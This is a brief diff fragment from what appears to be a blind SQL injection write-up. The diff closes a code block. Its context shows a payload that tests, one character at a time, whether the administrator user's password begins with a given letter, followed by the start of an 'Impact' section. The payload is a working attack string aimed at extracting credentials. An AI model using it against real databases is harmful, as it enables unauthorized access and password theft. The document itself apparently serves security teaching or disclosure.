@@ -36,9 +36,7 @@ Example payload used to verify if the first character of the `administrator` use
 
 ```sql
 xyz' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username = 'administrator') = 'a'--
-
-
-
+```
 
 
 5. Impact
